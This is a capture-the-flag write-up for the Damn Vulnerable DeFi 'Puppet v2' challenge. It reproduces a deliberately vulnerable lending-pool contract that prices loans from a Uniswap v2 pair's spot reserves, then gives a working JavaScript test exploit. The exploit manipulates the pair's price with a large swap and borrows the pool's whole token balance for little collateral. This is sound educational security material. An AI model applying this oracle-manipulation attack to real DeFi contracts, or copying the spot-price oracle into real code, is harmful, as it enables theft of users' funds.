#+AUTHOR: Francesco Cannarozzo
* Puppet v2
** Statement
   Just like the previous challenge, but with an Uniswap v2 pool.
** Files
*** PuppetV2Pool.sol
**** Code
     #+BEGIN_SRC solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/libraries/SafeMath.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

/**
 * @title PuppetV2Pool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetV2Pool {
    using SafeMath for uint256;

    address private _uniswapPair;
    address private _uniswapFactory;
    IERC20 private _token;
    IERC20 private _weth;
    
    mapping(address => uint256) public deposits;
        
    event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);

    constructor (
        address wethAddress,
        address tokenAddress,
        address uniswapPairAddress,
        address uniswapFactoryAddress
    ) public {
        _weth = IERC20(wethAddress);
        _token = IERC20(tokenAddress);
        _uniswapPair = uniswapPairAddress;
        _uniswapFactory = uniswapFactoryAddress;
    }

    /**
     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH
     *         Sender must have approved enough WETH in advance.
     *         Calculations assume that WETH and borrowed token have same amount of decimals.
     */
    function borrow(uint256 borrowAmount) external {
        require(_token.balanceOf(address(this)) >= borrowAmount, "Not enough token balance");

        // Calculate how much WETH the user must deposit
        uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);
        
        // Take the WETH
        _weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);

        // internal accounting
        deposits[msg.sender] += depositOfWETHRequired;

        require(_token.transfer(msg.sender, borrowAmount));

        emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount, block.timestamp);
    }

    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);
    }

    // Fetch the price from Uniswap v2 using the official libraries
    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(
            _uniswapFactory, address(_weth), address(_token)
        );
        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
    }
}

     #+END_SRC
**** Breakdown
***** State
      the pool handles swaps of wETH with tokens.
      References to these are passed to the constructor as addresses, and memorized as *IERC20*.
      Along with those, we pass addresses of a UniswapPair and an UniswapFactory.
***** borrow
      Allows borrowing /amount/ of token by depositing three times their value in wETH.
      to do so, after requiring the pool to hold enough tokens to give out,
      the required deposit is calculated through *calculateDepositOfWETHRequired()*.
      The calculated amount of wETH is then transferred from *msg.sender* to the pool,
      and after *deposits[msg.sender]* is updated,
      the appropriate event is emitted.
***** calculateDepositOfWETHRequired
      calls onto private function *_getOracleQuote()* for thrice the /tokenAmount/ passed in,
      multiplied by it's decimals.
***** _getOracleQuote 
      this private method interfaces with *UniswapV2Library* to get the factory's current
      reserves for wETH and token, after which these values are used to obtain a quote
      from the library.
** Exploit
   In principle, we're going to try the same we did in V1; that is, we're going to
   exploit the fact that we have more resources than the uniswap contract.

   looking at *UniswapV2Library.sol*, we can see how quotes are computed:

   #+BEGIN_SRC solidity
     function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
        require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        amountB = amountA.mul(reserveB) / reserveA;
    }
   #+END_SRC

   we can easily see that, by making *reserveB* very small, however nonzero, we can make *amountB* very small.

   as the contract's *_getOracleQuote()* appears to be calling onto this quote function using 
   *reserversWETH* as *amountB*, we just need to take most WETH out of the uniswap pair,
   swapping the coins we already own through the router,
   and then carry out the borrow at a very, very, discounted price. In brief:

   #+BEGIN_SRC javascript
       it('Exploit', async function () {
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
        

        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            ethers.utils.parseEther("9"),
            [this.token.address, this.weth.address],
            attacker.address,
            (await ethers.provider.getBlock('latest')).timestamp * 2
        )

       let newPrice = ethers.BigNumber.from(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE))

 

      expect(newPrice).to.be.lt(await ethers.provider.getBalance(attacker.address))

      await this.weth.connect(attacker).deposit({value:newPrice});

      await this.weth.connect(attacker).approve(this.lendingPool.address, await this.weth.balanceOf(attacker.address))

      await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)

     
    });
   #+END_SRC
   
